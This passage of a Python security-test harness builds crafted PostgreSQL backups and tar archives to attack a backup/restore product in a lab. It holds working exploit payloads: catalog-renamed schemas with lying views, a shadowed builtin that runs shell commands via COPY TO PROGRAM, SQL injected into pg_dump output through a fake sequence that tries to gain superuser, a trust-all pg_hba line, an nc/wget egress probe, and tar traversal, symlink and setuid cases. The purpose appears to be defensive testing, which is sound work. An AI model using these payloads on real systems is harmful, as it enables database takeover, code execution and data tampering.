    count as a member of the pg_trgm extension."""
    cases = ' '.join(f"WHEN '{k}' THEN {v} || ' AS ' || quote_ident(a.attname)" for k, v in replace.items())
    return f"""DO $d$ DECLARE cols text; BEGIN
  SELECT string_agg(CASE a.attname {cases} ELSE quote_ident(a.attname) END, ', ' ORDER BY a.attnum) INTO cols
    FROM pg_attribute a WHERE a.attrelid = 'public.{table}'::regclass AND a.attnum > 0 AND NOT a.attisdropped;
  EXECUTE 'CREATE VIEW pg_atk.{table} AS SELECT ' || cols || ' FROM public.{table}';
  INSERT INTO pg_depend VALUES ('pg_class'::regclass, 'pg_atk.{table}'::regclass, 0, 'pg_extension'::regclass,
    (SELECT oid FROM pg_extension WHERE extname = 'pg_trgm'), 0, 'e');
END $d$;
"""


# The real check is fooled without touching a builtin: a schema whose name starts with pg_ (renamed in the catalog;
# the check's schema list skips pg_* names and pg_dump never dumps them) holds views with the SAME row counts but
# lying values; the superuser's search_path (a per-role setting: it wins over the server's command line) puts them
# before public. pg_dump sets search_path '' and dumps the real public tables.
V2_LIES = (r"""
CREATE SCHEMA atk_lie;
UPDATE pg_catalog.pg_namespace SET nspname = 'pg_atk' WHERE nspname = 'atk_lie';
UPDATE public.scheduled_tasks SET state = 1;
""" + lie_view('scheduled_tasks', {'state': "'CASE WHEN state = 1 THEN 2::smallint ELSE state END'"})
    + lie_view('users', {'id': "'CASE WHEN id = ''admin'' THEN ''ha-admin'' ELSE id END'"})
    + lie_view('session_permissions', {'user_id': "'CASE WHEN user_id = ''__public__'' THEN ''nobody'' ELSE user_id END'"})
    + "ALTER ROLE postgres SET search_path = pg_atk, public;\n")

# Code inside the throwaway HA cluster: the per-role search_path also shadows a builtin the product's analysis calls
# (pg_encoding_to_char in OBJECTS_SQL) with a superuser plpgsql function -> COPY TO PROGRAM; the proof (fixed
# key=value lines, no data) goes to the data volume and is read by the harness's observation hook. Per-database
# library settings test whether the command-line hardening (HA_SERVER_SETTINGS) still wins.
PROOF_SH = ('(echo uid=$(id -u); echo ifaces=$(ls /sys/class/net | tr "\\n" ","); '
            'echo route_lines=$(wc -l < /proc/net/route); echo capeff=$(grep CapEff /proc/self/status | tr -d "\\t "); '
            'echo nonewprivs=$(grep NoNewPrivs /proc/self/status | tr -d "\\t "); '
            'touch /etc/atk 2>/dev/null && echo rootfs=writable || echo rootfs=readonly; '
            'touch /tmp/atk 2>/dev/null && echo tmp=writable || echo tmp=readonly; '
            'echo tmp_noexec=$(grep " /tmp " /proc/self/mounts | grep -c noexec); '
            'echo secrets=$(ls /run/secrets 2>/dev/null | wc -l); echo mounts=$(wc -l < /proc/self/mounts); '
            'echo pidsmax=$(cat /sys/fs/cgroup/pids.max 2>/dev/null); echo memmax=$(cat /sys/fs/cgroup/memory.max 2>/dev/null); '
            '(nc -z -w 2 10.0.2.2 22 2>/dev/null || wget -q -T 2 -O /dev/null http://1.1.1.1/ 2>/dev/null) '
            '&& echo egress=open || echo egress=blocked) > /var/lib/postgresql/data/atk-proof.txt 2>&1')
V3_HAPG_CODE = (r"""
CREATE SCHEMA atk_fn;
UPDATE pg_catalog.pg_namespace SET nspname = 'pg_atkfn' WHERE nspname = 'atk_fn';
CREATE FUNCTION pg_atkfn.pg_encoding_to_char(integer) RETURNS name LANGUAGE plpgsql AS $f$
BEGIN
  BEGIN
    COPY (SELECT 1) TO PROGRAM $p$sh -c '""" + PROOF_SH.replace("'", "'\"'\"'") + r"""'$p$;
  EXCEPTION WHEN others THEN NULL;
  END;
  RETURN pg_catalog.pg_encoding_to_char($1);
END $f$;
INSERT INTO pg_depend VALUES ('pg_proc'::regclass, 'pg_atkfn.pg_encoding_to_char(integer)'::regprocedure, 0,
  'pg_extension'::regclass, (SELECT oid FROM pg_extension WHERE extname = 'pg_trgm'), 0, 'e');
ALTER ROLE postgres SET search_path = pg_atkfn, pg_catalog, public;
ALTER DATABASE omnigent SET session_preload_libraries = 'auto_explain';
""")
V3_PG_FILES = [
    ('postgresql.auto.conf', b"shared_preload_libraries = 'auto_explain'\narchive_mode = on\n"
                             b"archive_command = 'touch /tmp/atk-archive'\nlisten_addresses = '*'\n"),
    ('postgresql.conf', b"include_dir = '/etc'\nlisten_addresses = '*'\nssl = on\n"),
    ('pg_hba.conf', b"host all all 0.0.0.0/0 trust\n"),
    ('recovery.signal', b''),
]


def hapg_observe(tmp):
    """Observation hook (harness only): what the throwaway HA cluster ended up with, before the check removes it."""
    out = {}
    proof = tmp.exec('hapg', ['sh', '-c', 'cat /var/lib/postgresql/data/atk-proof.txt 2>/dev/null || true'],
                     user='postgres', timeout=60, max_output=64 * 1024).stdout or b''
    out['proof'] = proof.decode('utf-8', 'replace').strip().splitlines()[:20]
    for setting in ('session_preload_libraries', 'shared_preload_libraries', 'archive_mode', 'archive_command',
                    'listen_addresses', 'ssl', 'search_path'):
        value = tmp.exec('hapg', ['psql', '-X', '-At', '-U', 'postgres', '-d', 'omnigent', '-c', f'SHOW {setting}'],
                         user='postgres', timeout=60, max_output=64 * 1024, check=False).stdout or b''
        out[setting] = value.decode('utf-8', 'replace').strip()[:80]
    return out


# A fake sequence: a table whose last_value column is TEXT, made a sequence (relkind S + a pg_sequence row) in the
# catalog. pg_dump writes `SELECT pg_catalog.setval('<name>', <last_value AS SENT BY THE SERVER>, <called>);` -- the
# value goes into the SQL unquoted (pg_dump.c dumpSequenceData), so the archive's SEQUENCE SET entry runs any SQL.
INJECTED_DO = r"""DO $x$ DECLARE r text := ''; BEGIN
 BEGIN EXECUTE 'CREATE TABLE public.atk_inj (i int)'; r := r || 'create_table=ok;'; EXCEPTION WHEN others THEN r := r || 'create_table=denied;'; END;
 BEGIN EXECUTE 'ALTER ROLE CURRENT_USER SUPERUSER'; r := r || 'superuser=ok;'; EXCEPTION WHEN others THEN r := r || 'superuser=denied;'; END;
 BEGIN EXECUTE 'CREATE FUNCTION public.atk_f() RETURNS int LANGUAGE sql AS ''SELECT 1'''; r := r || 'create_function=ok;'; EXCEPTION WHEN others THEN r := r || 'create_function=denied;'; END;
 BEGIN PERFORM pg_catalog.pg_read_file('/etc/hostname'); r := r || 'read_file=ok;'; EXCEPTION WHEN others THEN r := r || 'read_file=denied;'; END;
 BEGIN EXECUTE 'COPY (SELECT 1) TO PROGRAM ''true'''; r := r || 'copy_program=ok;'; EXCEPTION WHEN others THEN r := r || 'copy_program=denied;'; END;
 BEGIN EXECUTE 'CREATE TEMP TABLE atk_tmp (i int)'; r := r || 'temp_table=ok;'; EXCEPTION WHEN others THEN r := r || 'temp_table=denied;'; END;
 BEGIN EXECUTE 'ALTER ROLE CURRENT_USER SET work_mem = ''1MB'''; r := r || 'role_setting=ok;'; EXCEPTION WHEN others THEN r := r || 'role_setting=denied;'; END;
 BEGIN EXECUTE 'UPDATE public.scheduled_tasks SET state = state'; r := r || 'update_tasks=ok;'; EXCEPTION WHEN others THEN r := r || 'update_tasks=denied;'; END;
 BEGIN PERFORM count(*) FROM public.users; r := r || 'select_users=ok;'; EXCEPTION WHEN others THEN r := r || 'select_users=denied;'; END;
 r := r || 'user=' || current_user || ';';
 PERFORM pg_catalog.lo_from_bytea(0, pg_catalog.convert_to('atk-injected:' || r, 'UTF8'));
END $x$"""
FAKE_SEQ = (r"""
CREATE TABLE public.atk_seq (last_value text, log_cnt bigint, is_called boolean);
INSERT INTO public.atk_seq VALUES ($inj$1, true); """ + INJECTED_DO + r"""; SELECT pg_catalog.setval('public.atk_seq', 1$inj$, 0, true);
UPDATE pg_catalog.pg_class SET relkind = 'S' WHERE oid = 'public.atk_seq'::regclass;
INSERT INTO pg_catalog.pg_sequence VALUES ('public.atk_seq'::regclass, 'bigint'::regtype, 1, 1, 9223372036854775807, 1, 1, false);
""")
V4_TOC = FAKE_SEQ + r"""
CREATE DOMAIN public.atk_dom AS text CHECK (VALUE <> 'x');
CREATE TABLE public."atk
1; 0 0 TABLE DATA public users omnigent" (x text);
INSERT INTO public."atk
1; 0 0 TABLE DATA public users omnigent" VALUES ('x');
"""
V4B_LIVE_EXTRA = 'CREATE SEQUENCE public.atk_seq;\n'


def v5_leak(canary):
    """Data that violates a CHECK constraint of the trusted schema (HA's own constraint dropped; constraints are not
    compared), with a canary in a text column of the same row: the data load fails; no error may carry the row."""
    return r"""DO $d$ DECLARE r record; tcol text; n int := 0; BEGIN
  FOR r IN SELECT c.relname AS t, o.conname AS con, a.attname AS col, format_type(a.atttypid, a.atttypmod) AS typ
      FROM pg_constraint o JOIN pg_class c ON c.oid = o.conrelid
      JOIN pg_attribute a ON a.attrelid = c.oid AND a.attnum = o.conkey[1]
      WHERE o.contype = 'c' AND c.relnamespace = 'public'::regnamespace AND array_length(o.conkey, 1) = 1
      AND format_type(a.atttypid, a.atttypmod) IN ('smallint', 'integer') LOOP
    EXECUTE format('SELECT count(*) FROM public.%I', r.t) INTO n;
    CONTINUE WHEN n = 0;
    SELECT a.attname INTO tcol FROM pg_attribute a WHERE a.attrelid = ('public.' || quote_ident(r.t))::regclass
      AND a.attnum > 0 AND NOT a.attisdropped AND format_type(a.atttypid, a.atttypmod) IN ('text')
      ORDER BY a.attnum LIMIT 1;
    CONTINUE WHEN tcol IS NULL;
    EXECUTE format('ALTER TABLE public.%I DROP CONSTRAINT %I', r.t, r.con);
    EXECUTE format('UPDATE public.%I SET %I = 99, %I = %L WHERE ctid = (SELECT min(ctid) FROM public.%I)',
                   r.t, r.col, tcol, '""" + canary + r"""', r.t);
    RAISE NOTICE 'violated';
    EXIT;
  END LOOP;
END $d$;
"""


def run_variant(lab, builder, name, results, canaries):
    """Build one crafted backup, run the product on it, probe what a restore would install; structure only."""
    t0 = time.monotonic()
    res = {'variant': name}
    path = None
    try:
        if name == 'v1-visible-ddl':
            path, size, _ = builder.build(name, V1_VISIBLE_DDL)
            res['backup_bytes'] = size
            res['real'] = run_product(lab, path, convert=True)
            res['fooled'] = run_product(lab, path, bypass_verdict=True)
        elif name == 'v2-lies':
            path, size, _ = builder.build(name, V2_LIES)
            res['backup_bytes'] = size
            res['real'] = run_product(lab, path, test_mode=False)
        elif name == 'v3-hapg-code':
            path, size, _ = builder.build(name, V3_HAPG_CODE, pg_extra=V3_PG_FILES)
            res['backup_bytes'] = size
            res['real'] = run_product(lab, path, observe=hapg_observe, convert=True)
        elif name == 'v4-toc':
            path, size, _ = builder.build(name, V4_TOC)
            res['backup_bytes'] = size
            res['real'] = run_product(lab, path, convert=True)
            with mock.patch.object(omni, 'schema_differences', lambda *a, **k: []):
                res['fooled'] = run_product(lab, path, bypass_verdict=True)
                res['fooled']['simulated'].append('schema_differences bypassed too (tests data_only_toc alone)')
        elif name == 'v5-leak':
            canary = 'hacanary' + secrets.token_hex(12)
            canaries['ha_row_canary'] = canary
            path, size, _ = builder.build(name, v5_leak(canary))
            res['backup_bytes'] = size
            res['real'] = run_product(lab, path, convert=True)
        else:
            raise SystemExit(f'unknown variant {name}')
        for key in ('real', 'fooled'):
            run = res.get(key)
            if not run:
                continue
            run['leaks'] = scan_leaks(run.pop('_texts'), canaries)
            run['unsurfaced_stderr_has'] = scan_leaks([run.pop('_stderr', '')], canaries)
            if run.get('volumes'):
                db_tar = run['volumes']['omnigent-postgres-data']
                run['restored_probe'] = probe_restored(lab, db_tar, f'{name[:6]}{key[:2]}')
            shutil.rmtree(run.pop('_out_dir'), ignore_errors=True)
    except SystemExit:
        raise
    except Exception as error:  # noqa: BLE001 - recorded
        res['harness_error'] = f'{type(error).__name__}: {str(error)[:200]}'
        res['traceback_tail'] = traceback.format_exc().splitlines()[-6:]
    finally:
        if path is not None and Path(path).exists():
            res['backup_sha256'] = hashlib.sha256(Path(path).read_bytes()).hexdigest()
            Path(path).unlink()
    res['seconds'] = round(time.monotonic() - t0, 1)
    results.append(res)
    return res



# ====================================================================== tar-level attacks on the artifact store

ART = omni.ARTIFACTS


def tar_cases():
    big = {'name': f'{ART}/big', 'data': b'x' * 1024}
    good = {'name': f'{ART}/{"a" * 32}/{"b" * 64}', 'data': b'bundle'}
    cookie = {'name': f'{ART}/accounts-cookie-secret', 'data': b'c' * 64, 'mode': 0o600}
    base = [{'name': ART, 'type': 'dir'}, {'name': f'{ART}/{"a" * 32}', 'type': 'dir'}, good, cookie]
    return {
        't01-traversal-name': base + [{'name': f'{ART}/../../../../etc/atk', 'data': b'x'}],
        't02-absolute-name': base + [{'name': '/data/omnigent-home/.omnigent/artifacts/abs', 'data': b'x'}],
        't03-symlink-out': base + [{'name': f'{ART}/link', 'type': 'symlink', 'linkname': '/etc/passwd'}],
        't04-symlink-dir-then-file': base + [{'name': f'{ART}/d', 'type': 'symlink', 'linkname': '../../../..'},
                                             {'name': f'{ART}/d/x', 'data': b'x'}],
        't05-hardlink-to-postgres': [{'name': 'data/postgres', 'type': 'dir'},
                                     {'name': 'data/postgres/PG_VERSION', 'data': b'16\n'}] + base
                                    + [{'name': f'{ART}/hl', 'type': 'hardlink', 'linkname': 'data/postgres/PG_VERSION'}],
        't06-hardlink-to-cache': base + [{'name': f'{ART}/.cache', 'type': 'dir'},
                                         {'name': f'{ART}/.cache/secret', 'data': b's'},
                                         {'name': f'{ART}/hl', 'type': 'hardlink', 'linkname': f'{ART}/.cache/secret'}],
        't07-hardlink-forward': base + [{'name': f'{ART}/hl', 'type': 'hardlink', 'linkname': f'{ART}/later'},
                                        {'name': f'{ART}/later', 'data': b'l'}],
        't08-hardlink-to-cookie': base + [{'name': f'{ART}/hl', 'type': 'hardlink',
                                           'linkname': f'{ART}/accounts-cookie-secret'}],
        't09-fifo-and-device': base + [{'name': f'{ART}/fifo', 'type': 'fifo'},
                                       {'name': f'{ART}/dev', 'type': 'chr'}],
        't10-duplicate-file': base + [dict(good, data=b'second')],
        't11-setuid-and-sticky': base + [{'name': f'{ART}/suid', 'data': b'#!/bin/sh\n', 'mode': 0o6755},
                                         {'name': f'{ART}/sdir', 'type': 'dir', 'mode': 0o1777}],
        't12-control-chars': base + [{'name': f'{ART}/new\nline', 'data': b'x'},
                                     {'name': f'{ART}/esc\x1b[31m', 'data': b'x'}],
        't13-store-is-a-file': [{'name': 'data/omnigent-home/.omnigent', 'type': 'dir'},
                                {'name': ART, 'data': b'not a dir'}, cookie],
        't14-dotdot-middle': base + [{'name': f'{ART}/x/../../postgres/evil', 'data': b'x'}],
        't15-long-name': base + [{'name': f'{ART}/' + '/'.join(['d' * 100] * 30) + '/f', 'data': b'x'}],
        't16-hardlink-self': base + [{'name': f'{ART}/self', 'type': 'hardlink', 'linkname': f'{ART}/self'}],
        't17-hardlink-to-dir': base + [{'name': f'{ART}/hld', 'type': 'hardlink', 'linkname': f'{ART}/{"a" * 32}'}],
        't18-size-lie': base + [dict(big, pax={'size': str(10 * 1024 ** 3)})],
    }


def tar_attack(lab, name, entries):
    """scan_member (the product's artifact pass) on a crafted inner tar; accepted trees also go through
    nested.check_volume and a real `podman volume import` in the lab store, listed from a --network none container."""
    out = {'case': name}
    path = lab.scratch / f'tree-{name}.tar'
    with contextlib.suppress(FileNotFoundError):
        path.unlink()
    inner = hafixtures.tar_bytes([{'name': '.', 'type': 'dir'}, {'name': './addon.json', 'data': addon_json()},
                                  {'name': 'data', 'type': 'dir'}, {'name': 'data/omnigent-home', 'type': 'dir'},
                                  {'name': 'data/omnigent-home/.omnigent', 'type': 'dir'}]
                                 + [e for e in entries if e['name'] not in ('data/omnigent-home/.omnigent',)])
    tree = hacommon.TreeTar(path, 0, 0, lab.work.guard)
    try:
        src = omni.scan_member(io.BytesIO(inner), habackup.Report(), artifacts=tree)
        out['scan'] = {'accepted': True, 'artifact_files': src.artifact_files, 'cookie': src.cookie,
                       'keys': len(src.keys)}
    except BackupError as error:
        out['scan'] = {'accepted': False, 'code': error.code, 'message_head': error.message[:70]}
    except Exception as error:  # noqa: BLE001
        out['scan'] = {'accepted': False, 'code': 'exception', 'type': type(error).__name__}
    finally:
        tree.close()
    if out['scan']['accepted']:
        with tarfile.open(path, 'r:') as tar:
            members = tar.getmembers()
        out['tree'] = sorted({(m.name if len(m.name) < 80 else m.name[:40] + '...', 'dir' if m.isdir() else 'file'
                               if m.isfile() else 'hardlink' if m.islnk() else 'other', oct(m.mode))
                              for m in members})[:20]
        out['tree_names_outside'] = [m.name for m in members if not (m.name == 'artifacts'
                                                                     or m.name.startswith('artifacts/'))
                                     or '..' in m.name.split('/')]
        try:
            nested.check_volume(path, ids=lab.work._adapter.owner_ids())
            out['check_volume'] = 'ok'
        except BackupError as error:
            out['check_volume'] = f'refused: {error.code}'
        if out['check_volume'] == 'ok':
            tmp = lab.tmp
            role = 'tchk-' + name[:3]
            tmp.volume(role)
            data = path.read_bytes()
            try:
                tmp.volume_import(role, lambda o, data=data: o.write(data))
                listing = tmp.run(role, IMAGE, ['-c', "cd /v && find . -printf '%y %m %p\\n' | sort | head -40"],
                                  entrypoint='sh', volumes=[(tmp.name(role), '/v', 'ro')], timeout=120,
                                  read_only_root=True, max_output=256 * 1024, remove=True).stdout or b''
                lines = listing.decode('utf-8', 'replace').splitlines()
                out['imported'] = {'entries': len(lines), 'types': sorted({l.split(' ')[0] for l in lines}),
                                   'max_mode': max((l.split(' ')[1] for l in lines), default=''),
                                   'outside': [l for l in lines if ' ./' not in l and not l.endswith(' .')][:3]}
            except BackupError as error:
                out['imported'] = f'refused: {error.code}'
            finally:
                with contextlib.suppress(BackupError):
                    tmp.remove(role) if tmp.name(role) in tmp.containers else None
                tmp.remove_volume(role)
    with contextlib.suppress(FileNotFoundError):
        path.unlink()
    return out


def load_or_extract(lab):
    info = lab.scratch / 'real-info.json'
    if info.exists() and lab.schema_dump.exists() and lab.schema_sql.exists():
        lab.info = json.loads(info.read_text())
        return lab.info
    return lab.extract_real_schema()


def main(argv):
    """omnigent_secreview_attacks.py <scratch dir> <out.json> <variant> ...: one lab (real schema, live target),
    the variants one after the other; the result file is rewritten after each variant (structure only)."""
    os.nice(10)
    subprocess.run(['ionice', '-c3', '-p', str(os.getpid())], check=False)
    scratch, out, names = Path(argv[0]), Path(argv[1]), argv[2:]
    lab = Lab(scratch)
    started = time.time()
    doc = {'harness': 'tests/e2e/lab/omnigent_secreview_attacks.py', 'image': IMAGE,
           'fixture_sha256': FIXTURE_SHA, 'started': time.strftime('%Y-%m-%dT%H:%M:%S%z'), 'variants': []}
    try:
        doc['real_schema'] = {k: v for k, v in load_or_extract(lab).items() if k != 'check_constraints'}
        extra = V4B_LIVE_EXTRA if names == ['v4b-sequence-what-if'] else ''
        lab.start_live(extra)
        doc['live_extra_sql'] = extra or None
        canaries = {'live_admin_hash_canary': lab.live_canary}
        builder = Builder(lab)
        for name in names:
            require_room(name)
            if name == 'tar-attacks':
                t0 = time.monotonic()
                doc['variants'].append({'variant': name, 'cases': [tar_attack(lab, case, entries)
                                                                   for case, entries in tar_cases().items()],
                                        'seconds': round(time.monotonic() - t0, 1)})
            elif name == 'v4b-sequence-what-if':
                res = {'variant': name, 'simulated': ['the live target has a sequence public.atk_seq '
                                                      '(as a future Omnigent schema with a sequence would)']}
                t0 = time.monotonic()
                path, size, _ = builder.build(name, FAKE_SEQ)
                res['backup_bytes'] = size
                hook = {}
                real_finish = omni.finish_trusted_data

                def finish(cluster, hook=hook):
                    hook['large_objects_before_drop'] = cluster.query_json(
                        "SELECT coalesce(json_agg(convert_from(lo_get(oid), 'UTF8')), '[]') "
                        "FROM pg_largeobject_metadata", omni.DATABASE)
                    return real_finish(cluster)
                with mock.patch.object(omni, 'finish_trusted_data', finish):
                    run = run_product(lab, path, convert=True)
                run['simulated'].append('observation hook reads the new cluster before the restore role is dropped')
                run['leaks'] = scan_leaks(run.pop('_texts'), canaries)
                run['hook'] = hook
                if run.get('volumes'):
                    run['restored_probe'] = probe_restored(lab, run['volumes']['omnigent-postgres-data'], 'v4b')
                shutil.rmtree(run.pop('_out_dir'), ignore_errors=True)
                res['real'] = run
                res['backup_sha256'] = hashlib.sha256(Path(path).read_bytes()).hexdigest()
                Path(path).unlink()
                res['seconds'] = round(time.monotonic() - t0, 1)
                doc['variants'].append(res)
            else:
                run_variant(lab, builder, name, doc['variants'], canaries)
            doc['elapsed_s'] = round(time.time() - started, 1)
            out.write_text(json.dumps(doc, indent=1, ensure_ascii=False, default=str))
    finally:
        doc['lab_left_after_cleanup'] = lab.work.close()
        doc['elapsed_s'] = round(time.time() - started, 1)
        out.write_text(json.dumps(doc, indent=1, ensure_ascii=False, default=str))


if __name__ == '__main__':
    main(sys.argv[1:])

